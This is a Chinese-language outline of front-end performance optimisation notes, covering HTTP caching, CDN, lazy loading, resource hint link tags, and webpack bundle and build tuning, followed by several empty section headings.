-   1 开启缓存
    > 强缓存 expires cache-control：Max-age
    > 弱缓存 last-modified e-tag
-   2 CDN 静态加速
-   3 减少|合并 http 请求，雪碧图
-   4 非核心资源动态，或者非可视区域懒加载
-   5 DNS 预解析 &lt;link rel="dns-prefetch" href="//yuchengkai.cn"&gt;
-   6 预加载 &lt;link rel="preload" href="http://example.com"&gt;
-   7 预渲染 &lt;link rel="prerender" href="http://example.com"&gt;
-   8 使用 CDN 后，要考虑多域名.不然总会带上不需要的 cookie

##### 2 js 优化

-   1 非可视区域懒加载，例如图片懒加载
-   2 分时加载 timethunk 函数，节流，防抖
#####3 webpack 优化
**1 bundle 包优化**
-   1 异步加载，常用的例如路由异步加载，import()语法
-   2 提取公共资源
-   3 tree-shaking 删除项目中未引用的代码

**2 构建优化**

> 缩小 loader 解析范围，extensions配置越短越好
> 从两步着手，loader 解析和 js 压缩。

-   1 loader 解析 缩小 loader 解析范围，多用 resolve 中的 alias.loader 解析时固定范围，排除不需要解析的文件；使用 happyLoader,多进程解析
-   2 DllPlugin,提前打包公共且不太可变的库,配置单独的 webpack-dll-conf.js
-   3 代码压缩，使用多进程压缩parallel-uglify-plugin

#### 13 mpvue

#### 14 Vue 框架相关知识

#### 15 react 框架

#### 16 nodejs

#### 17 设计模式
